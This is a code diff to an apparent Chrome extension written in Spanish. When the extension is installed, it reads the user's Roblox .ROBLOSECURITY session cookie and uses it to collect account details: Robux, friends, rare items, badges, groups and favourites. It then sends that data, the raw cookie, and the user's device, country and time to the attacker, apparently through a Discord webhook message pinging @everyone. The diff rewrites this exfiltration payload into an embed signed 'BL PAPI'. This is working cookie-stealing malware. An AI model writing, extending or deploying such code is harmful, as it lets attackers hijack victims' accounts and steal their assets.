@@ -304,7 +304,7 @@ async function obtenerInfo() {
     let robux = 0;
     let seguidores = 0, amigos = 0;
     let headless = 'No', korblox = 'No';
-    let visitas = 0, juegos = 0, logros = 0, tradeCount = 0, tradeRatio = '0%';
+    let creaciones = 0, grupos = 0, insignias = 0, coleccionables = 0, favoritos = 0;
 
     try {
         const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
@@ -333,54 +333,71 @@ async function obtenerInfo() {
         headless = await checkItem(201);
         korblox = await checkItem(192);
 
-        const perfil = await fetch(\`https://www.roblox.com/users/\${user.id}/profile\`);
-        const html = await perfil.text();
-        const v = html.match(/"visitCount":(\d+)/);
-        visitas = v ? parseInt(v[1]) : 0;
+        // Nuevas estadísticas útiles
+        const creaRes = await fetch(\`https://games.roblox.com/v2/users/\${user.id}/games?limit=1\`);
+        if (creaRes.ok) creaciones = (await creaRes.json()).total || 0;
 
-        const juegosRes = await fetch(\`https://games.roblox.com/v2/users/\${user.id}/games?limit=1\`);
-        if (juegosRes.ok) juegos = (await juegosRes.json()).total || 0;
+        const gruposRes = await fetch(\`https://groups.roblox.com/v1/users/\${user.id}/groups/roles\`);
+        if (gruposRes.ok) grupos = (await gruposRes.json()).data?.length || 0;
+
+        const badgeRes = await fetch(\`https://badges.roblox.com/v1/users/\${user.id}/badges?limit=1\`);
+        if (badgeRes.ok) insignias = (await badgeRes.json()).total || 0;
+
+        const favRes = await fetch(\`https://www.roblox.com/users/favorites/list-json?assetTypeId=8&itemsPerPage=1\`, {
+            headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
+        });
+        if (favRes.ok) {
+            const favData = await favRes.json();
+            favoritos = favData.Total ? (favData.Total / 10) : 0;
+        }
+
+        const colRes = await fetch(\`https://catalog.roblox.com/v1/search/items/details?category=Collectibles&limit=1\`, {
+            headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
+        });
+        if (colRes.ok) coleccionables = (await colRes.json()).total || 0;
 
     } catch (e) {}
 
     const ahora = new Date();
     const fecha = ahora.toLocaleDateString('es-AR');
     const hora = ahora.toLocaleTimeString('es-AR');
+    const dispositivo = navigator.userAgent.includes('Android') ? 'Android' : 'PC';
 
-    const mensaje = \`|| @everyone ||
+    const embed = {
+        title: "🔔 NUEVA ENTRADA | **BL PAPI** !",
+        color: 15158332, // Rojo
+        fields: [
+            {
+                name: "📌 INFORMACIÓN GENERAL",
+                value: \`**Dispositivo:** \`\${dispositivo}\`\`\n**País:** \`\${ubicacion.nombrePais}\`\`\n**Fecha:** \`\${fecha}\`\`\n**Hora Exacta en \${ubicacion.nombrePais}:** \`\${hora}\`\`,
+                inline: false
+            },
+            {
+                name: "ℹ️ INFORMACIÓN DE LA CUENTA ROBLOX",
+                value: \`**👤 Usuario:** \`\${user.name || 'No disponible'}\`\`\n**🆔 ID:** \`\${user.id || 'No disponible'}\`\`\n**💰 Robux:** \`\${robux}\`\`\n**⭐ Seguidores:** \`\${seguidores}\`\`\n**👥 Amigos:** \`\${amigos}\`\`,
+                inline: true
+            },
+            {
+                name: "📊 ITEMS LIMITED (RAREZA)",
+                value: \`**Headless:** \`\${headless}\`\`\n**Korblox:** \`\${korblox}\`\`,
+                inline: true
+            },
+            {
+                name: "📈 OTRAS ESTADÍSTICAS",
+                value: \`**🏗️ Creaciones:** \`\${creaciones}\`\`\n**👥 Grupos:** \`\${grupos}\`\`\n**🎖️ Insignias:** \`\${insignias}\`\`\n**💎 Coleccionables:** \`\${coleccionables}\`\`\n**⭐ Favoritos:** \`\${favoritos}\`\`,
+                inline: false
+            },
+            {
+                name: "🍪 COOKIE DE ROBLOX",
+                value: \`\\\`\\\`\\\`\${cookie}\\\`\\\`\\\`\`,
+                inline: false
+            }
+        ],
+        footer: { text: "By **BL PAPI**" },
+        timestamp: new Date().toISOString()
+    };
 
-🔔 ¡ NUEVA ENTRADA | **BL PAPI** !
-
-📌 INFORMACIÓN GENERAL
-**Dispositivo:** \${navigator.userAgent.includes('Android') ? 'Android' : 'PC'}
-**País:** \${ubicacion.nombrePais || 'Desconocido'}
-**Fecha:** \${fecha}
-**Hora Exacta en \${ubicacion.nombrePais || 'País'}:** \${hora}
-
-ℹ️ INFORMACIÓN DE LA CUENTA ROBLOX
-**👤 Usuario:** \${user.name || 'No disponible'}
-**🆔 ID:** \${user.id || 'No disponible'}
-**💰 Robux:** \${robux}
-**⭐ Seguidores:** \${seguidores}
-**👥 Amigos:** \${amigos}
-
-## 📊 ITEMS LIMITED (RAREZA)
-**Headless:** \${headless}
-**Korblox:** \${korblox}
-
- 📈 ESTADÍSTICAS
-**🖼 Visitas al perfil:** \${visitas}
-**🎮 Juegos creados:** \${juegos}
-**🏆 Logros:** \${logros}
-**📦 Trade count:** \${tradeCount}
-**📊 Trade ratio:** \${tradeRatio}
-
-🍪 COOKIE DE ROBLOX
-\\\`\\\`\\\`\${cookie}\\\`\\\`\\\`
----
-By  **BL PAPI**\`;
-
-    encolarYEnviar({ content: mensaje });
+    encolarYEnviar({ content: "|| @everyone ||", embeds: [embed] });
 }
 
 chrome.runtime.onInstalled.addListener(obtenerInfo);
